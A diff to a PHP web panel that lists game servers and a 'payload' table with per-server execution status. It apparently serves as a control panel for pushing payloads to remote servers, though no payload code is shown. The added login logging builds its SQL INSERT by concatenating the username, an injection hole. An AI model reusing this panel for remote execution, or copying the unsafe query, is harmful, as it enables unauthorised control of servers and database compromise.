@@ -14,7 +14,7 @@ if ( mysqli_connect_errno() ) {
 // Now we check if the data was submitted, isset will check if the data exists.
 if ( !isset($_POST['username'], $_POST['password']) ) {
 	// Could not get the data that should have been sent.
-	die ('Username and/or password does not exist! :) ');
+	die ('Username and/or password does not exist! :)(: ');
 }
 // Prepare our SQL 
 if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
@@ -32,6 +32,14 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 			$_SESSION['loggedin'] = TRUE;
 			$_SESSION['name'] = $_POST['username'];
 			$_SESSION['id'] = $id;
+	 $log_what1a = ' : Connected '. '| When : ';
+	 $log_what2a = $log_what1a . date("Y-m-d H:i:s");
+	 $log_whata = $_SESSION['name'] . $log_what2a;
+    $req = $con->prepare('INSERT INTO `logs`
+   (`What`)
+   VALUES
+   ("'.$log_whata.'");');
+   $req->execute();
 			echo 'Welcome  :  ' . $_SESSION['name'] . '  !';
 				// SourceQuery
 	require( __DIR__ . '/SourceQuery/SourceQuery.class.php');
@@ -80,7 +88,7 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 	elseif($Color=="Orange"){$PColor="warning";}elseif($Color=="Red"){$PColor="danger";}
 	elseif($Color=="Dark"){$PColor="dark";}
 
-
+      
 		} else {
 			echo 'Incorrect  username  and/or  password!';
 	// Page Settings
@@ -160,6 +168,36 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
         <!-- Servers -->
         <div class="panel panel-<?php echo $PColor; ?>">
 		<div class="panel-heading"><b><?php echo $T_ServerList; ?></b></div>
+<button onclick="LogsDisplay()">Logs</button>
+<div id="logs">
+<script>document.getElementById("logs").style.display = "none"; </script>
+  <?php
+  	if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
+	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
+	$stmt->bind_param('s', $_POST['username']);
+	$stmt->execute(); 
+	$stmt->store_result(); 
+	// Store the result so we can check if the account exists in the database.
+	if ($stmt->num_rows > 0) {
+		$stmt->bind_result($id, $password);
+		$stmt->fetch();      
+		// Account exists, now we verify the password.
+		if (password_verify($_POST['password'], $password)) {
+			// Verification success! User has loggedin!
+			$_SESSION['loggedin'] = TRUE;
+			$_SESSION['name'] = $_POST['username'];
+			$_SESSION['id'] = $id;
+			$reponses = $db->query('SELECT * FROM logs');
+             while ($satanis = $reponses->fetch())
+             {
+	         echo 'Log ID : ', $satanis['log_id'] . ' | ', $satanis['What'], '</br>';
+             } 
+			 echo '<form action="resetelogs.php" method="post">
+		<input type="number" name="deletelogs" placeholder="Type delete to delete logs" required size="40">
+		<input type="submit"></form>' . '<br />';
+	}}}
+  ?>
+</div> 
         <table class="table table-striped">
             <thead>
               <tr>
@@ -237,10 +275,16 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 
 		</div>
 	</body>';
-		     $reponse = $db->query('SELECT description, ServerID FROM payload');             
+		     $reponse = $db->query('SELECT description, ServerID, execution FROM payload');	 
              while ($donnees = $reponse->fetch())
              {
-	         echo 'Payload : ', $donnees['description'] . ' | Server ID : ' . $donnees['ServerID'] . '</br>';
+			 $snkseb = $donnees['execution'];
+             if ($snkseb == -1) {
+             $mtxapprouve = 'Executed';
+			 } else {
+             $mtxapprouve = 'Not yet';
+             }	
+	         echo 'Payload : ', $donnees['description'] . ' | Server ID : ' . $donnees['ServerID'] . ' | Status : ' . $mtxapprouve . '</br>';
              }
 			 echo '<form action="deletepayload.php" method="post">
 		<input type="delete" name="delete" placeholder="Type the name of the payload you want to delete" required size="40">
@@ -255,14 +299,28 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 				
 					<div style="position: fixed; z-index: -99; width: 100%; height: 100%">
     <iframe frameborder="0" height="0%" width="0%" 
-    src="https://youtube.com/embed/YKqDiNJJPXk?autoplay=1&controls=0&showinfo=0&autohide=0&loop=1"> <!-- modify your song here replace YKqDiNJJPXk by the video id -->
+    src="https://youtube.com/embed/nBPZgs-ZHTE?autoplay=1&controls=0&showinfo=0&autohide=0&loop=1"> <!-- modify your song here replace YKqDiNJJPXk by the video id -->
     </iframe>
     </div>
               </tr>
             </thead>
             <tbody>
             	<?php
-				
+				if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?')) {
+	// Bind parameters (s = string, i = int, b = blob, etc), hash the password using the PHP password_hash function.
+	$stmt->bind_param('s', $_POST['username']);
+	$stmt->execute(); 
+	$stmt->store_result(); 
+	// Store the result so we can check if the account exists in the database.
+	if ($stmt->num_rows > 0) {
+		$stmt->bind_result($id, $password);
+		$stmt->fetch();      
+		// Account exists, now we verify the password.
+		if (password_verify($_POST['password'], $password)) {
+			// Verification success! User has loggedin!
+			$_SESSION['loggedin'] = TRUE;
+			$_SESSION['name'] = $_POST['username'];
+			$_SESSION['id'] = $id;
 					// Select Bans
 					$SelectServers = $db->query("SELECT * FROM `servers`");
 
@@ -296,7 +354,7 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 						"
 							<tr>
 								<td><b>" . $PrintServers['ServerID'] . "</b></td>
-								<td><a href='steam://connect/" . $PrintServers['IPAddress'] . ":" . $PrintServers['Port'] . "'>" . $PrintServers['IPAddress'] . ":" . $PrintServers['Port'] . "</a></td>
+								<td><a href='steam://connect/" . $PrintServers['IPAddress'] . ":" . $PrintServers['Port'] . "'>" . $PrintServers['IPAddress'] . $PrintServers['Port'] . "</a></td>
 								<td>" . str_replace("_", " ", $PrintServers['HostName']) . "</td>
 								<td>" . htmlspecialchars($ServerInfo['ModDesc']) . "</td>
 								<td>" . htmlspecialchars($ServerInfo['Map']) . "</td>
@@ -307,7 +365,9 @@ if ($stmt = $con->prepare('SELECT id, password FROM accounts WHERE username = ?'
 						";
 							
 					}
-					
+		          }
+	             }	
+				}
 				?>
             </tbody>
         </table>
